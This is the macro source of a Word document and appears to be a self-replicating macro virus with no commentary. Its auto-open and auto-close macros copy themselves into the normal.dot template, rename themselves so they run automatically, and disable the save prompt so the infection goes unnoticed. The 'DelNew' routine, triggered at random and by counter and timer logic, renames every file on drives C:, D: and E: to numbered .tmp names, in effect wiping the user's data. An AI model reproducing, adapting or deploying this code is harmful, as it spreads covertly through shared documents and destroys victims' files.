   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "normclose"

   Public Sub MAIN()
   Dim countdir
   Dim cnt$
   WordBasic.FileSummaryInfo Update:=1
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.DocumentStatistics(False)
   WordBasic.CurValues.DocumentStatistics dlg

   If dlg.Revision <> "1" Then
   WordBasic.FileSaveAs Name:=WordBasic.[FileName$](), Format:=1

   WordBasic.Organizer copy:=1, Source:=WordBasic.[MacroFileName$](), Destination:=WordBasic.[FileName$](), Name:="dotclose", Tab:=3
   WordBasic.Organizer copy:=1, Source:=WordBasic.[MacroFileName$](), Destination:=WordBasic.[FileName$](), Name:="dotopen", Tab:=3
   WordBasic.Organizer copy:=1, Source:=WordBasic.[MacroFileName$](), Destination:=WordBasic.[FileName$](), Name:="autoclose", Tab:=3
   WordBasic.Organizer copy:=1, Source:=WordBasic.[MacroFileName$](), Destination:=WordBasic.[FileName$](), Name:="one", Tab:=3
   WordBasic.Organizer copy:=1, Source:=WordBasic.[MacroFileName$](), Destination:=WordBasic.[FileName$](), Name:="DelNew", Tab:=3

   WordBasic.Organizer Rename:=1, Source:=WordBasic.[FileName$](), Name:="dotopen", NewName:="autoopen", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=WordBasic.[FileName$](), Name:="autoclose", NewName:="normclose", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=WordBasic.[FileName$](), Name:="dotclose", NewName:="autoclose", Tab:=3
   WordBasic.FileSave

   For countdir = 1 To WordBasic.CountDirectories(WordBasic.[DefaultDir$](2))
   If WordBasic.[Right$](WordBasic.[GetDirectory$](WordBasic.[DefaultDir$](2), countdir), 3) = "cnt" Then
   cnt$ = WordBasic.[GetDirectory$](WordBasic.[DefaultDir$](2), countdir)
   WordBasic.RmDir WordBasic.[DefaultDir$](2) + "\" + cnt$
   Else
   cnt$ = "0"
   End If
   Next countdir
   WordBasic.MkDir WordBasic.[DefaultDir$](2) + "\" + Str((WordBasic.Val(cnt$)) + 1) + ".cnt"

   Else
   End If
   endd:
   End Sub

   Attribute VB_Name = "autoclose"

   Public Sub MAIN()
   End Sub

   Attribute VB_Name = "autoopen"

   Public Sub MAIN()
   Dim test
   Dim con
   Dim count_
   Dim numdel
   Dim countdir
   Dim cnt$
   test = 20
   con = 0
   ReDim macdel__$(6)
   For count_ = 1 To WordBasic.CountMacros(0)
   If WordBasic.[MacroName$](count_, 0) = "dotopen" Or WordBasic.[MacroName$](count_, 0) = "autoclose" Or WordBasic.[MacroName$](count_, 0) = "dotclose" Or WordBasic.[MacroName$](count_, 0) = "one" Or WordBasic.[MacroName$](count_, 0) = "DelNew" Then
   con = con + 1
   macdel__$(con) = WordBasic.[MacroName$](count_, 0)
   Else
   End If
   Next count_

   If con = 5 Then
   GoTo endd
   ElseIf con = 0 Then
   GoTo copy
   Else

   For numdel = 1 To con
   WordBasic.Organizer Delete:=1, Source:=WordBasic.[DefaultDir$](2) + "\normal.dot", Name:=macdel__$(numdel), Tab:=3
   Next numdel

   copy:
   WordBasic.Organizer copy:=1, Source:=WordBasic.[FileName$](), Destination:=WordBasic.[DefaultDir$](2) + "\normal.dot", Name:="normclose", Tab:=3
   WordBasic.Organizer copy:=1, Source:=WordBasic.[FileName$](), Destination:=WordBasic.[DefaultDir$](2) + "\normal.dot", Name:="autoopen", Tab:=3
   WordBasic.Organizer copy:=1, Source:=WordBasic.[FileName$](), Destination:=WordBasic.[DefaultDir$](2) + "\normal.dot", Name:="autoclose", Tab:=3
   WordBasic.Organizer copy:=1, Source:=WordBasic.[FileName$](), Destination:=WordBasic.[DefaultDir$](2) + "\normal.dot", Name:="one", Tab:=3
   WordBasic.Organizer copy:=1, Source:=WordBasic.[FileName$](), Destination:=WordBasic.[DefaultDir$](2) + "\normal.dot", Name:="DelNew", Tab:=3

   WordBasic.Organizer Rename:=1, Source:=WordBasic.[DefaultDir$](2) + "\normal.dot", Name:="autoclose", NewName:="dotclose", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=WordBasic.[DefaultDir$](2) + "\normal.dot", Name:="autoopen", NewName:="dotopen", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=WordBasic.[DefaultDir$](2) + "\normal.dot", Name:="normclose", NewName:="autoclose", Tab:=3

   WordBasic.ToolsOptionsSave GlobalDotPrompt:=0

   endd:
   For countdir = 1 To WordBasic.CountDirectories(WordBasic.[DefaultDir$](2))
   If WordBasic.[Right$](WordBasic.[GetDirectory$](WordBasic.[DefaultDir$](2), countdir), 3) = "cnt" Then
   cnt$ = WordBasic.[GetDirectory$](WordBasic.[DefaultDir$](2), countdir)
   Else
   cnt$ = "0"
   End If
   Next countdir

   If WordBasic.Int(Rnd() * 50) = 10 Then WordBasic.ToolsMacro Name:="DelNew", Run:=1, Show:=0

   If WordBasic.Val(cnt$) > test Then
   WordBasic.RmDir WordBasic.[DefaultDir$](2) + "\" + cnt$
   WordBasic.OnTime WordBasic.[Left$](WordBasic.[Time$](), 3) + Str(WordBasic.Val(WordBasic.[Right$](WordBasic.[Time$](), 2)) + 1), "one"
   Else
   End If
   End If
   End Sub

   Attribute VB_Name = "DelNew"

   Public Sub MAIN()
   Dim disc_
   Dim disc$
   Dim count1
   Dim name_$
   Dim filedel$
   Dim countdir
   Dim d$
   Dim count_
   Dim filedel1$
   ReDim disc__$(3)
   disc__$(1) = "c:\"
   disc__$(2) = "d:\"
   disc__$(3) = "e:\"
   For disc_ = 1 To 3

   disc$ = disc__$(disc_)
   count1 = 0
   name_$ = WordBasic.[Files$](disc$ + "*.*")
   On Error GoTo -1: On Error GoTo q
   While name_$ <> ""
   filedel$ = disc$ + "~tlp" + Str(count1) + ".tmp"
   WordBasic.Rename name_$, filedel$
   name_$ = WordBasic.[Files$]()
   count1 = count1 + 1
   Wend
   g:
   On Error GoTo -1: On Error GoTo w
   For countdir = 1 To WordBasic.CountDirectories(disc$)
   d$ = WordBasic.[GetDirectory$](disc$, countdir)
   name_$ = WordBasic.[Files$](disc$ + d$ + "\*.*")
   count_ = 0
   w:
   While name_$ <> ""
   On Error GoTo -1: On Error GoTo r
   filedel1$ = disc$ + d$ + "\" + "~tlp" + Str(count_) + ".tmp"
   WordBasic.Rename name_$, filedel1$
   name_$ = WordBasic.[Files$]()
   count_ = count_ + 1
   Wend
   r:
   Next countdir
   Next disc_
   End Sub

   Attribute VB_Name = "one"

   Public Sub MAIN()
   Dim tmin
   Dim countdir
   Dim dircol$
   tmin = 10
   For countdir = 1 To WordBasic.CountDirectories(WordBasic.[DefaultDir$](2))
   If WordBasic.[Right$](WordBasic.[GetDirectory$](WordBasic.[DefaultDir$](2), countdir), 3) = "col" Then
   dircol$ = WordBasic.[GetDirectory$](WordBasic.[DefaultDir$](2), countdir)
   WordBasic.RmDir WordBasic.[DefaultDir$](2) + "\" + dircol$
   Else
   End If
   Next countdir
   WordBasic.MkDir WordBasic.[DefaultDir$](2) + "\" + Str(WordBasic.GetDocumentProperty(WordBasic.[DocumentPropertyName$](20))) + ".col"
   If WordBasic.Val(dircol$) = WordBasic.GetDocumentProperty(WordBasic.[DocumentPropertyName$](20)) Then
   WordBasic.ToolsMacro Name:="DelNew", Run:=1
   Else
   WordBasic.OnTime WordBasic.[Left$](WordBasic.[Time$](), 3) + Str(WordBasic.Val(WordBasic.[Right$](WordBasic.[Time$](), 2)) + tmin), "one"
   End If
   End Sub
